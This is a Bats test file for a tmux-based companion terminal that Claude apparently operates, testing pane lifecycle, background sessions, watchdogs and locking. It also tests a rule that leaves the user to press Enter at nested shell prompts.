    "$TERMINAL" open >/dev/null
    d=$(companion_dir)
    pid=$(sed -n 's/^laya_pid=//p' "$d/state")
    kill -9 "$pid"; while kill -0 "$pid" 2>/dev/null; do sleep .1; done
    run "$TERMINAL" open
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    new=$(sed -n 's/^laya_pid=//p' "$d/state")
    [ -n "$new" ] && [ "$new" != "$pid" ]
    kill -0 "$new"
    run "$TERMINAL" run -- 'echo back'
    [[ "$output" == *$'\nback\n'* ]] || { echo "$output"; false; }
    "$TERMINAL" close
}

@test "python3 that send starts in the pane gets no shell rule" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- 'python3 -q' >/dev/null
    pane_shows '>>>'
    run "$TERMINAL" send --enter -- 'x = set()'
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    run "$TERMINAL" send --enter -- 'print(len(x))'
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    "$TERMINAL" send --key C-d >/dev/null
}

@test "in a nested bash, send types text but only the user ends the line" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- "env PS1='nested\$ ' bash --norc --noprofile" >/dev/null
    pane_shows 'nested$'
    run --separate-stderr "$TERMINAL" send --enter -- "touch '$BATS_TEST_TMPDIR/ran'"
    [ "$status" -eq 2 ] || { echo "$status $stderr"; false; }
    [ "$stderr" = 'at a nested shell prompt, only the user ends a line: send the text with no --enter, then ask the user to press Enter in the pane' ]
    run "$TERMINAL" send -- "touch '$BATS_TEST_TMPDIR/ran'"
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    run "$TERMINAL" send --key Enter
    [ "$status" -eq 2 ]
    "$TERMINAL" send --key C-c >/dev/null
    "$TERMINAL" send --key C-d >/dev/null
    sleep .5
    [ ! -e "$BATS_TEST_TMPDIR/ran" ]
}

@test "a nested shell with a group of options that ends in o is a nested shell" {
    "$TERMINAL" open >/dev/null
    # A shell that a script starts (as npm or make do) with no job control
    # (+m) does not lead a process group: only the option parse can find
    # that it reads the terminal. The ; true keeps sh from an exec of zsh.
    # (An interactive bash leads a group of its own, also with +m.)
    "$TERMINAL" send --enter -- "sh -c 'zsh -f +m -euo pipefail; true'" >/dev/null
    pane_shows '%'
    run --separate-stderr "$TERMINAL" send --enter -- "touch '$BATS_TEST_TMPDIR/ran'"
    [ "$status" -eq 2 ] || { echo "$status $stderr"; false; }
    [[ "$stderr" == 'at a nested shell prompt, only the user ends a line'* ]] || false
    "$TERMINAL" send --key C-c >/dev/null
    "$TERMINAL" send --key C-d >/dev/null
    sleep .5
    [ ! -e "$BATS_TEST_TMPDIR/ran" ]
}

@test "a bash with a name that is not a shell name is a nested shell too" {
    ln -s "$(command -v bash)" "$BATS_TEST_TMPDIR/xq"
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- "env PS1='odd\$ ' '$BATS_TEST_TMPDIR/xq' --norc --noprofile" >/dev/null
    pane_shows 'odd$'
    run --separate-stderr "$TERMINAL" send --enter -- "touch '$BATS_TEST_TMPDIR/ran'"
    [ "$status" -eq 2 ] || { echo "$status $stderr"; false; }
    [ "$stderr" = 'at a nested shell prompt, only the user ends a line: send the text with no --enter, then ask the user to press Enter in the pane' ]
    "$TERMINAL" send --key C-d >/dev/null
    sleep .5
    [ ! -e "$BATS_TEST_TMPDIR/ran" ]
}

@test "after the user ends a line in a nested shell, the next send does not read the old text or the prompt" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- "env PS1='source\$ ' bash --norc --noprofile" >/dev/null
    pane_shows 'source$'
    run "$TERMINAL" send -- 'echo one'
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    # A key that edits the line: the shell rule then reads all of the line.
    run "$TERMINAL" send --key End
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    # The user presses Enter.
    "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" Enter
    pane_shows 'one'
    sleep .3
    # The prompt word source is not text that clux typed.
    run --separate-stderr "$TERMINAL" send -- 'echo two'
    [ "$status" -eq 0 ] || { echo "$status $stderr"; false; }
    "$TERMINAL" send --key C-c >/dev/null
    "$TERMINAL" send --key C-d >/dev/null
}

@test "a line that ends after Home on a wrapped line goes whole" {
    local tail="$BATS_TEST_TMPDIR/tail-mark"
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" send -- "echo $(printf 'x%.0s' $(seq 1 150)) > '$tail'"
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    run "$TERMINAL" send --key Home
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    run "$TERMINAL" send --key Enter
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    "$TERMINAL" wait --timeout 5 --idle >/dev/null
    [ "$(wc -c < "$tail" | tr -d ' ')" -eq 151 ]
}

@test "keys that come while a command runs do not run at the next clux prompt" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- 'sleep 2' >/dev/null
    sleep .3
    run "$TERMINAL" send -- "touch '$BATS_TEST_TMPDIR/typeahead'"
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    run "$TERMINAL" send --key Enter
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    "$TERMINAL" wait --timeout 5 --idle >/dev/null
    sleep .5
    [ ! -e "$BATS_TEST_TMPDIR/typeahead" ]
}

@test "Claude can type in vim when the cursor is on a character" {
    command -v vim >/dev/null || skip 'no vim'
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- "vim -u NONE -N '$BATS_TEST_TMPDIR/v.txt'" >/dev/null
    pane_shows '~'
    run "$TERMINAL" send -- 'ihello'
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    run "$TERMINAL" send --key Escape
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    run "$TERMINAL" send -- ':wq'
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    run "$TERMINAL" send --key Enter
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    "$TERMINAL" wait --timeout 5 --idle >/dev/null
    [ "$(cat "$BATS_TEST_TMPDIR/v.txt")" = hello ]
}

# Background 1
@test "a background session opens a window in the dashboard session and closes it" {
    bg_setup
    bg_add_cache
    local want
    run "$TERMINAL" open
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    [[ "$output" == *$'\nmode=window\nwindow=dash:1' ]] || false
    [ "$("$REAL_TMUX" list-windows -t dash -F '#{window_name}' | tail -1)" = 'clux-terminal 0123abcd' ]
    run "$TERMINAL" run -- 'echo hi'
    [ "$status" -eq 0 ]
    [[ "$output" == *$'hi\nexit=0' ]] || false
    want=$(pwd -P)
    run "$TERMINAL" run -- 'pwd -P'
    [ "$status" -eq 0 ]
    [[ "$output" == *"$want"$'\nexit=0' ]] || false
    run "$TERMINAL" close
    [ "$status" -eq 0 ]
    [ ! -e "$(bg_dir)" ]
    [ "$(bg_window_count)" = 1 ]
}

# Background 2
@test "a background session with no dashboard opens a private server and prints both attach lines" {
    bg_setup
    local sock agents="$CLUX_AGENT_STATE_DIR/$BG_DASH_KEY/agents" decoy
    mkdir -p "$agents" "$CLUX_AGENT_STATE_DIR/1-1/agents"
    # Each decoy names a pane that is not the dashboard of this session, so
    # open must refuse it: the file of another session, a pane that is gone,
    # and the file of this session under another tmux server.
    for decoy in \
        "$agents/$BG_DASH_PANE~fedcba98-4567-4890-abcd-ef0123456789" \
        "$agents/%99~$CLAUDE_CODE_SESSION_ID" \
        "$CLUX_AGENT_STATE_DIR/1-1/agents/$BG_DASH_PANE~$CLAUDE_CODE_SESSION_ID"; do
        : > "$decoy"
        run "$TERMINAL" open
        [ "$status" -eq 0 ] || { echo "$decoy: $output"; false; }
        sock="$(bg_dir)/sock"
        [[ "$output" == *$'\nmode=socket\nattach=tmux -S '"$sock"$' attach\nattach_in_tmux=TMUX= tmux -S '"$sock"' attach' ]] \
            || { echo "$decoy: $output"; false; }
        run "$TERMINAL" run -- 'echo sock-ok'
        [[ "$output" == *$'sock-ok\nexit=0' ]] || false
        [ "$(bg_window_count)" = 1 ] || { echo "$decoy: a window in the dashboard"; false; }
        "$TERMINAL" close
        ! "$REAL_TMUX" -S "$sock" list-sessions >/dev/null 2>&1 || false
        rm -f "$decoy"
    done
}

# Background 4
@test "after a restart of the tmux server, a stale pane id reaches no pane of the user" {
    bg_setup
    bg_add_cache
    local d stale i=0
    "$TERMINAL" open >/dev/null
    d=$(bg_dir)
    stale=$(sed -n 's/^pane=//p' "$d/state")
    # Stop the watchdog, so that only the verbs of the test act on $d.
    # [inferred] This matters only from Task 7, which starts the watchdog.
    [ -z "$(sed -n 's/^watch_pid=//p' "$d/state")" ] || kill "$(sed -n 's/^watch_pid=//p' "$d/state")"
    "$REAL_TMUX" kill-server
    sleep .5
    "$REAL_TMUX" -f /dev/null new-session -d -s user -x 120 -y 40 'bash --noprofile --norc -i' 3>&-
    while ! "$REAL_TMUX" list-panes -t "$stale" >/dev/null 2>&1 && [ "$i" -lt 8 ]; do
        "$REAL_TMUX" split-window -d -t user 'bash --noprofile --norc -i' 3>&- 2>/dev/null \
            || "$REAL_TMUX" new-window -d -t user 'bash --noprofile --norc -i' 3>&-
        i=$((i + 1))
    done
    "$REAL_TMUX" list-panes -t "$stale" >/dev/null
    # History in the pane of the user, so that a clear-history would show.
    "$REAL_TMUX" send-keys -t "$stale" 'seq 1 100' Enter
    i=0
    while [ "$("$REAL_TMUX" display-message -p -t "$stale" '#{history_size}')" -eq 0 ] && [ "$i" -lt 25 ]; do
        sleep .2
        i=$((i + 1))
    done
    run "$TERMINAL" run -- 'echo SHOULD-NOT-TYPE'
    [ "$status" -eq 4 ]
    ! "$REAL_TMUX" capture-pane -p -t "$stale" | grep -q SHOULD-NOT-TYPE || false
    run "$TERMINAL" close
    [ "$status" -eq 0 ]
    [ ! -e "$d" ]
    "$REAL_TMUX" list-panes -t "$stale" >/dev/null
    [ "$("$REAL_TMUX" display-message -p -t "$stale" '#{history_size}')" -gt 0 ]
}

# Background 5
@test "after a clear with no hook, open under the new session id closes the old companion" {
    bg_setup
    bg_add_cache
    local old
    "$TERMINAL" open >/dev/null
    old=$(bg_dir)
    export CLUX_SESSION_ID=fedcba98-4567-4890-abcd-ef0123456789
    run "$TERMINAL" run -- 'echo x'
    [ "$status" -eq 4 ]
    [ -d "$old" ]
    bg_add_cache
    run "$TERMINAL" open
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    [ ! -e "$old" ]
    [ -d "$(bg_dir)" ]
    [ "$("$REAL_TMUX" list-windows -t dash -F '#{window_name}' | grep -c '^clux-terminal 0123abcd$')" = 0 ]
    [ "$("$REAL_TMUX" list-windows -t dash -F '#{window_name}' | grep -c '^clux-terminal fedcba98$')" = 1 ]
    "$TERMINAL" close
}

# Background 6
@test "the directory and the exported variables stay between runs in window mode" {
    bg_setup
    bg_add_cache
    run "$TERMINAL" open
    [[ "$output" == *'mode=window'* ]] || false
    "$TERMINAL" run -- 'cd /tmp' >/dev/null
    "$TERMINAL" run -- 'export X=1' >/dev/null
    run "$TERMINAL" run -- 'pwd; echo $X'
    [[ "$output" == *$'/tmp\n1\nexit=0' ]] || false
    "$TERMINAL" close
}

@test "open starts a watchdog for a background companion, open starts it again when it is gone, and close stops it" {
    bg_setup
    bg_add_cache
    local d watch new i=0
    "$TERMINAL" open >/dev/null
    d=$(bg_dir)
    watch=$(sed -n 's/^watch_pid=//p' "$d/state")
    [ -n "$watch" ]
    ps -ww -o command= -p "$watch" | grep -q 'terminal.sh watch --session 0123abcd'
    "$TERMINAL" open >/dev/null
    [ "$(sed -n 's/^watch_pid=//p' "$d/state")" = "$watch" ]
    kill "$watch"
    while kill -0 "$watch" 2>/dev/null && [ "$i" -lt 25 ]; do sleep .2; i=$((i + 1)); done
    "$TERMINAL" open >/dev/null
    new=$(sed -n 's/^watch_pid=//p' "$d/state")
    [ -n "$new" ]
    [ "$new" != "$watch" ]
    kill -0 "$new"
    "$TERMINAL" close
    i=0
    while kill -0 "$new" 2>/dev/null && [ "$i" -lt 25 ]; do sleep .2; i=$((i + 1)); done
    ! kill -0 "$new" 2>/dev/null || false
}

# Background 3
@test "the watchdog closes a background companion and stops its laya server when the owner process ends" {
    bg_setup
    bg_add_cache
    local data="$BATS_TEST_TMPDIR/data" d pid i=0
    make_fake_venv "$data/clux/laya"
    make_fake_checkpoint "$BATS_TEST_TMPDIR/hf"
    run env CLUX_LAYA_URL= CLUX_LAYA_KEY= XDG_DATA_HOME="$data" HF_HUB_CACHE="$BATS_TEST_TMPDIR/hf" \
        "$TERMINAL" open
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    d=$(bg_dir)
    pid=$(sed -n 's/^laya_pid=//p' "$d/state")
    [ -n "$pid" ]
    kill -0 "$pid"
    kill "$CLAUDE_PID"
    wait "$CLAUDE_PID" 2>/dev/null || true
    while [ -e "$d" ] && [ "$i" -lt 75 ]; do sleep .2; i=$((i + 1)); done
    [ ! -e "$d" ] || { echo 'the directory stayed'; false; }
    [ "$(bg_window_count)" = 1 ] || { echo 'the window stayed'; false; }
    i=0
    while kill -0 "$pid" 2>/dev/null && [ "$i" -lt 25 ]; do sleep .2; i=$((i + 1)); done
    ! kill -0 "$pid" 2>/dev/null || { kill -9 "$pid"; echo 'the laya server stayed'; false; }
}

# The directory lock: open, close, the watchdog and the reaper make or remove
# a companion directory only while they hold DIR.lock.
@test "two parallel opens of one background session make one companion, and close removes it" {
    bg_setup
    local d p1 p2
    "$TERMINAL" open > "$BATS_TEST_TMPDIR/o1" 2>&1 &
    p1=$!
    "$TERMINAL" open > "$BATS_TEST_TMPDIR/o2" 2>&1 &
    p2=$!
    wait "$p1" || { cat "$BATS_TEST_TMPDIR/o1"; false; }
    wait "$p2" || { cat "$BATS_TEST_TMPDIR/o2"; false; }
    d=$(bg_dir)
    [ -f "$d/state" ]
    grep -q '^mode=socket$' "$BATS_TEST_TMPDIR/o1"
    grep -q '^mode=socket$' "$BATS_TEST_TMPDIR/o2"
    [ "$("$REAL_TMUX" -S "$d/sock" list-panes -a | wc -l | tr -d ' ')" = 1 ]
    run "$TERMINAL" run -- 'echo race-ok'
    [[ "$output" == *$'race-ok\nexit=0' ]] || false
    [ ! -e "$d.lock" ]
    run "$TERMINAL" close
    [ "$status" -eq 0 ]
    [ ! -e "$d" ]
    [ ! -e "$d.lock" ]
}

@test "while another verb holds the lock, open and close refuse with exit 5 and change nothing" {
    bg_setup
    local d
    d=$(bg_dir)
    mkdir -p "${d%/*}"
    lock_holder "$d"
    run env CLUX_TERMINAL_LOCK_WAIT=1 "$TERMINAL" open
    [ "$status" -eq 5 ] || { echo "$output"; false; }
    [[ "$output" == *'another open or close of this companion is at work'* ]] || false
    [ ! -e "$d" ]
    [ "$(bg_window_count)" = 1 ]
    stop_holders
    run "$TERMINAL" open
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    [ ! -e "$d.lock" ]
    lock_holder "$d"
    run env CLUX_TERMINAL_LOCK_WAIT=1 "$TERMINAL" close
    [ "$status" -eq 5 ] || { echo "$output"; false; }
    [ -f "$d/state" ]
    # The SessionEnd hook waits at most 2 s and says nothing. A separate
    # process closes the companion when the holder ends.
    hook_close_while_held "$d" '{"session_id":"0123abcd-4567-4890-abcd-ef0123456789"}'
}

# hook_close_while_held DIR PAYLOAD — with a live holder of the lock of DIR,
# the SessionEnd hook ends in 3 s or less with status 0 and no output, and
# the companion stays. When the holder ends, the companion closes with no
# other call.
hook_close_while_held() {
    local start took
    [ -f "$1/state" ]
    start=$(date +%s)
    run "$TERMINAL" close --hook <<< "$2"
    took=$(( $(date +%s) - start ))
    [ "$status" -eq 0 ]
    [ -z "$output" ] || { echo "hook output: $output"; false; }
    [ "$took" -le 3 ] || { echo "the hook took $took s"; false; }
    [ -f "$1/state" ]
    stop_holders
    wait_gone "$1" 10 || { echo 'the later close did not close the companion'; false; }
    wait_gone "$1.lock" 5
}

# wait_gone PATH S — wait at most S seconds until PATH is gone.
wait_gone() {
    local i
    for i in $(seq 1 $(( $2 * 5 ))); do
        [ -e "$1" ] || return 0
        sleep 0.2
    done
    [ ! -e "$1" ]
}

@test "in split mode, the SessionEnd hook closes the companion later while another verb holds the lock" {
    local d pane
    "$TERMINAL" open > /dev/null
    d=$(companion_dir)
    pane=$(sed -n 's/^pane=//p' "$d/state")
    lock_holder "$d"
    hook_close_while_held "$d" '{"session_id":"0123abcd-4567-4890-abcd-ef0123456789"}'
    ! "$REAL_TMUX" -S "$TMUX_SOCKET" list-panes -t "$pane" >/dev/null 2>&1 \
        || { echo "the companion pane $pane is still there"; false; }
}

@test "the later close of the SessionEnd hook does not close a new companion with another token" {
    local d
    "$TERMINAL" open > /dev/null
    d=$(companion_dir)
    lock_holder "$d"
    run "$TERMINAL" close --hook <<< '{"session_id":"0123abcd-4567-4890-abcd-ef0123456789"}'
    [ "$status" -eq 0 ]
    # A new session in the same pane opens a new companion before the lock
    # is free: a new token in the state.
    sed -i.bak 's/^token=.*/token=0000000000000000/' "$d/state"
    stop_holders
    wait_gone "$d.lock" 10
    sleep 1
    [ -f "$d/state" ] || { echo 'the later close closed a companion it did not see'; false; }
    rm -f "$d/state.bak"
}

@test "in split mode, open refuses with exit 5 while another verb holds the lock" {
    local d
    "$TERMINAL" open >/dev/null
    d=$(companion_dir)
    "$TERMINAL" close
    [ ! -e "$d" ]
    lock_holder "$d"
    run env CLUX_TERMINAL_LOCK_WAIT=1 "$TERMINAL" open
    [ "$status" -eq 5 ] || { echo "$output"; false; }
    [ ! -e "$d" ]
    stop_holders
    run "$TERMINAL" open
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    [ -f "$d/state" ]
    "$TERMINAL" close
}

@test "the reaper keeps a dead companion while a live verb holds its lock, and removes it after" {
    bg_setup
    local old watch
    "$TERMINAL" open >/dev/null
    old=$(bg_dir)
    watch=$(sed -n 's/^watch_pid=//p' "$old/state")
    [ -z "$watch" ] || kill "$watch"
    kill "$CLAUDE_PID"
    wait "$CLAUDE_PID" 2>/dev/null || true
    lock_holder "$old"
    # A second session: its open runs the reaper over the dead companion.
    export CLUX_SESSION_ID=fedcba98-4567-4890-abcd-ef0123456789
    sleep 600 </dev/null >/dev/null 2>&1 3>&- &
    export CLAUDE_PID=$!
    printf '%s\n' "$CLAUDE_PID" > "$BATS_TEST_TMPDIR/bg-owner"
    run "$TERMINAL" open
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    [ -f "$old/state" ] || { echo 'the reaper removed a locked companion'; false; }
    stop_holders
    run "$TERMINAL" open
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    [ ! -e "$old" ]
    [ ! -e "$old.lock" ]
    "$TERMINAL" close
}

@test "in split mode, the later close of a hook that saw no state keeps a companion of another session" {
    local d
    CLUX_SESSION_ID=aaaaaaaa-4567-4890-abcd-ef0123456789 "$TERMINAL" open > /dev/null
    d=$(companion_dir)
    grep -qx 'session=aaaaaaaa-4567-4890-abcd-ef0123456789' "$d/state" \
        || { echo 'a pane owner does not record its session'; cat "$d/state"; false; }
    lock_holder "$d"
    # The hook of session aaaaaaaa runs while an open is at work and has no
    # state yet.
    mv "$d/state" "$d/state.hidden"
    run "$TERMINAL" close --hook <<< '{"session_id":"aaaaaaaa-4567-4890-abcd-ef0123456789"}'
    [ "$status" -eq 0 ] && [ -z "$output" ] || { echo "hook: $status $output"; false; }
    # The open that holds the lock is of a new session in the same pane.
    sed 's/^session=.*/session=bbbbbbbb-4567-4890-abcd-ef0123456789/' "$d/state.hidden" > "$d/state"
    rm -f "$d/state.hidden"
    stop_holders
    wait_gone "$d.lock" 10
    sleep 1
    [ -f "$d/state" ] || { echo 'the later close closed the companion of another session'; false; }
}

@test "after claude --resume, open re-uses the companion with the new owner, and the old watchdog keeps it" {
    bg_setup
    local d pane watch first second
    # Stdout only: the dashboard search of path.sh can write to stderr.
    first=$("$TERMINAL" open 2> "$BATS_TEST_TMPDIR/err1") || { cat "$BATS_TEST_TMPDIR/err1"; false; }
    d=$(bg_dir)
    pane=$(sed -n 's/^pane=//p' "$d/state")
    watch=$(sed -n 's/^watch_pid=//p' "$d/state")
    [ -n "$watch" ] && kill -0 "$watch" || { echo 'no watchdog'; false; }
    # The Claude process ends; `claude --resume` starts a new process with
    # the same session id, within the pause of the watchdog.
    kill "$CLAUDE_PID"
    wait "$CLAUDE_PID" 2>/dev/null || true
    sleep 600 </dev/null >/dev/null 2>&1 3>&- &
    export CLAUDE_PID=$!
    printf '%s\n' "$CLAUDE_PID" > "$BATS_TEST_TMPDIR/bg-owner"
    second=$("$TERMINAL" open 2> "$BATS_TEST_TMPDIR/err2") || { echo "second open failed"; cat "$BATS_TEST_TMPDIR/err2"; false; }
    [ "$second" = "$first" ] || { echo "a new companion: $second (was: $first)"; false; }
    grep -qx "owner_pid=$CLAUDE_PID" "$d/state" || { echo 'the owner is not the new process'; cat "$d/state"; false; }
    # The old watchdog reads the state at its next pause (10 s).
    sleep 12
    [ -f "$d/state" ] || { echo 'the watchdog closed the companion of a live owner'; false; }
    "$REAL_TMUX" -S "$d/sock" list-panes -t "$pane" >/dev/null 2>&1 || { echo 'the companion pane is gone'; false; }
    run "$TERMINAL" run -- 'echo resumed'
    [[ "$output" == *$'resumed\nexit=0' ]] || { echo "run: $output"; false; }
    "$TERMINAL" close
}

# open_parallel N — start N opens at the same time; each writes its output
# to $BATS_TEST_TMPDIR/o<n>. OPEN_FAILS names each open that did not exit 0.
open_parallel() {
    local n p
    OPEN_FAILS=
    : > "$BATS_TEST_TMPDIR/opens"
    for n in $(seq 1 "$1"); do
        "$TERMINAL" open > "$BATS_TEST_TMPDIR/o$n" 2>&1 3>&- &
        printf '%s %s\n' "$n" "$!" >> "$BATS_TEST_TMPDIR/opens"
    done
    while read -r n p; do
        wait "$p" || OPEN_FAILS="$OPEN_FAILS $n"
    done < "$BATS_TEST_TMPDIR/opens"
}

# one_companion N — the N opens of open_parallel all name one pane, and the
# private server of the session has one pane.
one_companion() {
    local n pane first=
    for n in $(seq 1 "$1"); do
        pane=$(sed -n 's/^pane=//p' "$BATS_TEST_TMPDIR/o$n")
        [ -n "$pane" ] || { echo "open $n: no pane"; cat "$BATS_TEST_TMPDIR/o$n"; return 1; }
        [ -n "$first" ] || first="$pane"
        [ "$pane" = "$first" ] || { echo "open $n: pane $pane, not $first"; return 1; }
    done
    [ "$("$REAL_TMUX" -S "$(bg_dir)/sock" list-panes -a | wc -l | tr -d ' ')" = 1 ]
}

@test "after an open is killed with kill -9, eight parallel opens make one companion" {
    bg_setup
    local d p i=0 n
    d=$(bg_dir)
    "$TERMINAL" open > /dev/null 2>&1 3>&- &
    p=$!
    # The open holds the lock from its start: kill it while it works.
    while [ ! -e "$d.lock" ] && [ ! -L "$d.lock" ] && [ "$i" -lt 100 ]; do sleep .05; i=$((i + 1)); done
    sleep .3
    kill -9 "$p"
    wait "$p" 2>/dev/null || true
    open_parallel 8
    [ -z "$OPEN_FAILS" ] || { for n in $OPEN_FAILS; do echo "open $n:"; cat "$BATS_TEST_TMPDIR/o$n"; done; false; }
    one_companion 8
    run "$TERMINAL" run -- 'echo after-kill'
    [[ "$output" == *$'after-kill\nexit=0' ]] || { echo "$output"; false; }
    run "$TERMINAL" close
    [ "$status" -eq 0 ]
    [ ! -e "$d" ]
    [ ! -e "$d.lock" ]
}

@test "a lock left by a holder whose pid a live process now has does not block open or close" {
    bg_setup
    local d start
    d=$(bg_dir)
    mkdir -p "${d%/*}"
    # The lock of clux 4.1.0 before this fix: a link to the pid of its
    # holder. The pid is live (a sleep of the test), but the holder is gone.
    sleep 600 < /dev/null > /dev/null 2>&1 3>&- &
    printf '%s\n' "$!" >> "$BATS_TEST_TMPDIR/holders"
    ln -s "$!" "$d.lock"
    start=$SECONDS
    run env CLUX_TERMINAL_LOCK_WAIT=5 "$TERMINAL" open
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    [ $((SECONDS - start)) -lt 5 ]
    # A lock file that a killed holder left: its lock is free.
    : > "$d.lock"
    start=$SECONDS
    run env CLUX_TERMINAL_LOCK_WAIT=5 "$TERMINAL" close
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    [ $((SECONDS - start)) -lt 5 ]
    [ ! -e "$d" ]
    [ ! -e "$d.lock" ] && [ ! -L "$d.lock" ]
}
